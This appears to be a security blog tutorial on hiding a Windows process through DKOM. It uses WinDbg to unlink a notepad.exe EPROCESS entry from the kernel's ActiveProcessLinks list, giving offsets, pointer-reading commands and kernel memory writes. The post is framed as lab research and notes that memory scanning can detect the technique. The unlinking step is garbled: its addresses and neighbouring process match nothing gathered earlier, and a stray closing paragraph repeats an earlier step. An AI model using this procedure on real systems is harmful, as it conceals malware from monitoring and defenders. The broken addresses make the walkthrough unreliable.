---
title: "Exploring DKOM (Direct Kernel Object Manipulation) for Process Hiding on Windows"
date: 2025-07-29T00:12:29+01:00
draft: false
github_link: "https://github.com/gurusabarish/hugo-profile"
author: "Durok"
tags:
  - DKOM
  - Kernel
  - Driver
  - Rootkit
  - Windbg
  - Volatility
image: /images/posts/02_DKOM/00_DKOM_Cover.png
description: "**DKOM (Direct Kernel Object Manipulation)** technique, a well-known stealth method used by advanced malware and rootkits on Windows systems to hide processes from standard system monitoring tools."
toc: 
---

## Exploring DKOM for Process Hiding on Windows

In this post we will explore the **DKOM (Direct Kernel Object Manipulation)** technique, a well-known stealth method used by advanced malware and rootkits on Windows systems to hide processes from standard system monitoring tools.

### What is `DKOM`?

**`DKOM`** stands for **Direct Kernel Object Manipulation**.  
It is a technique that operates **directly on kernel data structures in memory**. Instead of hooking APIs or patching the kernel, DKOM modifies kernel objects in place, leaving no hooks that can be detected with integrity checks.

One common use case:  
- **Hiding a process** by directly altering the kernel’s doubly-linked list of `EPROCESS` structures.

When a process is created in Windows, the kernel allocates an `EPROCESS` structure that describes it.  
Each `EPROCESS` contains a member called `ActiveProcessLinks`, which is a **doubly-linked list (FLINK/BLINK)** pointing to the previous and next process.  
The Windows API functions and tools like `Task Manager`, `Process Explorer` or `pslist` traverse this list to enumerate active processes.

![image.png](/images/posts/02_DKOM/01_Eprocesses.png)

By **manipulating these pointers**, an attacker can:

1. **Unlink the target process** from the `ActiveProcessLinks` list:
   - Adjust `Flink` and `Blink` pointers of the neighboring nodes so they skip the target.
   - The `EPROCESS` object itself remains allocated in memory, but is no longer part of the list.
2. As a result:
   - Standard enumeration APIs (`NtQuerySystemInformation`, WMI, etc.) will not report the hidden process.
   - Security tools relying only on this list will not see the process, although it continues to execute.
3. The hidden process can still be detected by:
   - **Direct memory scanning** (e.g., `Volatility psscan`) because the structure still exists in RAM.
   - **Kernel callbacks or ETW events** that do not depend on list walking.

![image.png](/images/posts/02_DKOM/02_DKOM1.png)

This **unlinking technique** is the essence of DKOM-based process hiding. No hooks, no patching, just **surgical manipulation of in-memory linked lists** inside the kernel.


---

## Hiding a Process with `WinDbg`

### Preparing the Environment

Before experimenting with **DKOM** on Windows, it is crucial to work in a **controlled lab environment** to avoid damaging a production system.  

For this PoC you will need:

- A **Windows test machine (physical or virtual)** dedicated to research and malware analysis.
  - A VM (e.g., Hyper-V, VMware, VirtualBox) is recommended for snapshot/rollback capabilities.
  - **Kernel debugging must be enabled** on the target machine if you plan to attach remotely.

#### Tools Required

- **`WinDbg`** (Preview or Classic)
   - Obtain from the [Microsoft Store](https://apps.microsoft.com/store/detail/windbg-preview/9PGJGD53TN86) or the [Windows SDK](https://developer.microsoft.com/windows/downloads/windows-sdk/).

- **Administrator Privileges**
   - Run `WinDbg` with elevated privileges to access live kernel memory.

- **Target Process**
   - Launch a simple process (e.g., `notepad.exe`) that will be used as a target to demonstrate hiding.

> ✏️ **Note:** 
>     Recent versions of `WinDbg` (Preview) automatically configure and download symbols from the Microsoft symbol server. Manual configuration is usually not required unless you need a custom symbol path or offline cache.

#### Kernel Debugging Setup

If your PoC involves **live kernel debugging** (recommended for DKOM analysis):

- Configure debugging transport (COM, TCP, or local):
   - For VMs, **named pipe (COM)** or **network KD** is most convenient.
   - Enable kernel debugging on the target:
   ```powershell
   # Administrator
   bcdedit /debug on
   ```
- Reboot the machine with debugging enabled.

> 💡 **Tip:** 
>     For local debugging, use `WinDbg` -> `File` -> `Start Debugging` -> `Attach to kernel` -> `Local`.

![image.png](/images/posts/02_DKOM/03_Windbg0.png)

#### Verification

After attaching `WinDbg` to the live kernel or memory dump verify the debugger connection:

```
!process 0 0
```

This should list all active processes.

![image.png](/images/posts/02_DKOM/04_Windbg1.png)

With the environment ready, you will be able to **inspect, modify and unlink `EPROCESS` structures manually**

### Identify addresses to manipulate

Follow these steps to hide a process using DKOM in a controlled lab environment:

1. **Identify the Target Process**
   - Use the `!process 0 0` command in WinDbg to list all active processes.
   - Find the entry for your target process (e.g., `notepad.exe`) and note its `EPROCESS` address.
      ![image.png](/images/posts/02_DKOM/05_Windbg2.png)
      <br><br>
      | Process Name | PID    | EPROCESS Address |
      |--------------|--------|------------------|
      | Notepad.exe  | 0x358c | ffffa00df22e60c0 |

2. **Locate the ActiveProcessLinks Field**
   - Display the structure of the `EPROCESS` object using:
      ```
      dt _EPROCESS <EPROCESS_address>
      ```
      ![image.png](/images/posts/02_DKOM/06_Windbg3.png)
   - Locate the `UniqueProcessId` field, in `Windows 11 24h2` offset is `+0x1d0`
   - Locate the `ActiveProcessLinks` field, which is part of the doubly linked list connecting all processes, in `Windows 11 24h2` the offset is `+0x1d8`.
   - Locate the `ImgageFileName` field, in `Windows 11 24h2` offset is `+0x338`
      | Field              | Offset (Windows 11 24h2) | Description                                    |
      |--------------------|--------------------------|------------------------------------------------|
      | UniqueProcessId    | 0x1d0                    | Unique identifier for the process              |
      | ActiveProcessLinks | 0x1d8                    | Pointer to the doubly-linked list of processes |
      | ImageFileName      | 0x338                    | Executable file name of the process            |

   - Read the `Flink` and `Blink` pointers from the `ActiveProcessLinks` field.
      ```
      # Abstract
      dt nt!_EPROCESS <EPROCESS_address> ActiveProcessLinks
      dq <EPROCESS_address> + <ActiveProcessLinks_offset> L2
      
      # Our case
      dt nt!_EPROCESS ffffa00df22e60c0 ActiveProcessLinks
      dq ffffa00df22e60c0 + 0x1d8 L2
      ```
      ![image.png](/images/posts/02_DKOM/07_Windbg4.png)
      <br><br>
      | Process Name | PID    | EPROCESS Address | ActiveProcessLinks | FLINK             | BLINK             |
      |--------------|--------|------------------|--------------------|-------------------|-------------------|
      | Notepad.exe  | 0x358c | ffffa00df22e60c0 | ffffa00d`f22e6298  | ffffa00d`f7ecc258 | ffffa00d`fa0e2258 |

3. **Gather Information on Neighboring Processes (PID and ImageFileName)**
   - Identify the processes `ImageFileName` immediately before and after your target in the linked list by examining the `Flink` and `Blink` pointers.
      ```
      # +0x338 is the `ImageFileName` offset
      da  ffffa00d`f7ecc258 - 0x1d8 + 0x338
      da  ffffa00d`fa0e2258 - 0x1d8 + 0x338
      ```

      ![image.png](/images/posts/02_DKOM/08_Windbg5.png)
   
   - Identify the `UniqueProcessId` and `EPROCESS` addresses of the neighboring processes.
   - For each neighboring process, use their respective `EPROCESS` addresses to inspect their details:
      ```
      # --- Get forward process Pid - WidgetBoard.exe
      dd ffffa00df7ecc258 - 0x1d8 + 0x1d0 L1
      # 00002ba0

      # --- Get forward EPROCESS Address - WidgetBoard.exe
      !process 2ba0 0
      # Searching for Process with Cid == 2ba0
      # PROCESS ffffa00df7ecc080
      #     SessionId: none  Cid: 2ba0    Peb: 2cf2d6000  ParentCid: 0238
      #     DirBase: 4b9b8000  ObjectTable: ffffe589e1773b40  HandleCount: 795.
      #     Image: WidgetBoard.exe


      # --- Get forward ActiveProcessLinks, FLINK, BLINK - WidgetBoard.exe
      dt nt!_EPROCESS ffffa00df7ecc080 ActiveProcessLinks
      # +0x1d8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffa00d`f1aad258 - 0xffffa00d`f22e6298 ]

      dq ffffa00df7ecc080 + 0x1d8 L2
      # ffffa00d`f7ecc258  ffffa00d`f1aad258 ffffa00d`f22e6298
      ```

      ![image.png](/images/posts/02_DKOM/09_Windbg6.png)
      <br><br>
      ```
      # --- Get backward process Pid - EngHost.exe
      dd ffffa00d`fa0e2258 - 0x1d8 + 0x1d0 L1
      # 00003660

      # Get backward EPROCESS Address - EngHost.exe
      !process 3660 0
      # Searching for Process with Cid == 3660
      # PROCESS ffffa00dfa0e2080
      #    SessionId: none  Cid: 3660    Peb: df40b7c000  ParentCid: 23e0
      #    DirBase: 0050c000  ObjectTable: ffffe589e17aa580  HandleCount: 261.
      #    Image: EngHost.exe


      # --- Get backward ActiveProcessLinks, FLINK, BLINK - EngHost.exe
      dt nt!_EPROCESS ffffa00dfa0e2080 ActiveProcessLinks
      # +0x1d8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffa00d`f22e6298 - 0xffffa00d`f3ea2258 ]

      dq ffffa00dfa0e2080 + 0x1d8 L2
      # ffffa00d`fa0e2258  ffffa00d`f22e6298 ffffa00d`f3ea2258
      ```
      ![image.png](/images/posts/02_DKOM/10_Windbg7.png)      

   - Note the `Process ID (PID)`, `ImageFileName`, `EPROCESS`, `ActiveProcessLinks`, `FLINK`, `BLINK` for both neighboring processes. This ensures you are correctly identifying the links you need to update when unlinking the target process.
      | Position | Process Name    | PID    | EPROCESS Address | ActiveProcessLinks | FLINK              | BLINK              |
      |----------|-----------------|--------|------------------|--------------------|--------------------|--------------------|
      | Backward | EngHost.exe     | 3660   | ffffa00dfa0e2080 | ffffa00d`fa0e2258` | ffffa00d`f22e6298  | ffffa00df3ea2258   |
      |          | Notepad.exe     | 0x358c | ffffa00df22e60c0 | ffffa00df`22e6298` | ffffa00d`f7ecc258` | ffffa00d`fa0e2258` |
      | Forward  | WidgetBoard.exe | 0x2ba0 | ffffa00df7ecc080 | ffffa00d`f7ecc258` | ffffa00df1aad258   | ffffa00d`f22e6298` |



4. **Unlink the Process**
To manipulate these links and remove the `Notepad.exe` process from the active list, update the following pointers:
   - Point `EngHost.exe` `FLINK` in `ffff8e091cd97258` to `FLINK` `vcpkgsrv.exe` in `ffff8e091cb1b258`
      ```
      eq ffff8e091cd97258 ffff8e091cb1b258
      ```
   - Point `BLINK` `vcpkgsrv.exe` at `ffff8e091cb1b258 + 8` to `FLINK` `EngHost.exe` at `ffff8e091cd97258`.
      ```
      # +8 because LIST_ENTRY has two FLINK/BLINK fields and each is 8 bytes
      eq ffff8e091cb1b258 + 8 ffff8e091cd97258
      ```

5. **Verify the Process is Hidden**
   - Run `!process 0 0` again. The target process should no longer appear in the list, even though it is still running.

> ⚠️ **Warning:**  
> Modifying kernel memory can destabilize or crash the system. Always work in a disposable test environment and take snapshots before making changes.

This procedure demonstrates how DKOM can be used to hide a process by manipulating kernel data structures directly.

Identify the `EPROCESS` entry for the test process (`notepad.exe`). Locate the line corresponding to `notepad.exe` and note the address of its `EPROCESS` structure. This address will be used in the next steps to directly manipulate the structure in memory.
